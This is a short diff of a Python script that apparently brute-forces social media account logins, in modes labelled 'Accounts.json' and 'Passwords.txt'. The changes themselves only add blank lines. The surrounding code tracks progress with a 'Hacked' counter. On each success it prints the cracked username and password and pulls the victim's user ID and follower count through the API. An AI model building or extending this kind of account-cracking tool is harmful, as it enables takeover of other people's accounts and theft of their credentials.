@@ -371,11 +371,13 @@ if option in ['1', 'Accounts.json']:
                        'Time Remaining: 00:00:00 ^| Hacked: %s' % (
                            account[0], index + 1, len(accounts), password,
                            round(((checked / len(cleaned)) * 100), 3), hacked))
+
                 api.getSelfUsernameInfo()
                 result = api.LastJson
                 user_id = result['user']['pk']
                 username = result['user']['username']
                 followers = result['user']['follower_count']
+
                 print('%s[%sHACKED%s] %s%s:%s %s| '
                       '%sUsername: %s %s| %sUser ID: %s %s| %sFollowers: %s' % (
                           green(), reset(), green(), reset(), account[0], password, green(),
@@ -438,11 +440,13 @@ elif option in ['2', 'Passwords.txt']:
                    'Time Remaining: 00:00:00 ^| Hacked: %s' % (
                        target, password,
                        round(((checked / len(cleaned)) * 100), 3), hacked))
+
             api.getSelfUsernameInfo()
             result = api.LastJson
             user_id = result['user']['pk']
             username = result['user']['username']
             followers = result['user']['follower_count']
+
             print('%s[%sHACKED%s] %s%s:%s %s| '
                   '%sUsername: %s %s| %sUser ID: %s %s| %sFollowers: %s' % (
                       green(), reset(), green(), reset(), target, password, green(),
